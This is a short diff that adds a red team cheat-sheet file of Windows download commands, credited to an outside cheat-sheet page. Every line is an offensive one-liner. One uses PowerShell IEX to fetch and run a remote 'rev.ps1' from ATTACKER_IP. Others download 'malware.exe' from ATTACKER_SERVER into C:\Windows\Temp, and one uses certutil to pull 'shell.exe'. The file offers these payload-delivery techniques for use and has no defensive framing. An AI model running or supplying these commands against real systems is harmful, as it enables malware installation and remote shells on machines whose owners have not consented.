@@ -1,0 +1,7 @@
+# Downloading files
+# https://morph3sec.com/Cheat-Sheets/Windows-Red-Team-Cheat-Sheet/
+
+IEX (New-Object System.Net.WebClient).DownloadString("http://ATTACKER_IP/rev.ps1")
+(New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_SERVER/malware.exe", "C:\Windows\Temp\malware.exe")  
+Invoke-WebRequest "http://ATTACKER_SERVER/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"  
+certutil.exe -urlcache -split -f "http://127.0.0.1:80/shell.exe" shell.exe
